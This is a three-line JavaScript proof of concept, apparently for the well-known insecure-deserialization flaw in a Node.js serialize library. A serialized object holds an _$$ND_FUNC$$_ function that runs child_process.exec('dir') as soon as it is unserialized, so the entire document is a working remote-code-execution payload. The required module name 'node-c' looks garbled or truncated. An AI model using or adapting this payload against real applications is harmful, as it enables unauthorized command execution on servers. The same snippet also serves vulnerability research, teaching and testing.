var serialize = require('node-c');
var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'dir\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
serialize.unserialize(payload);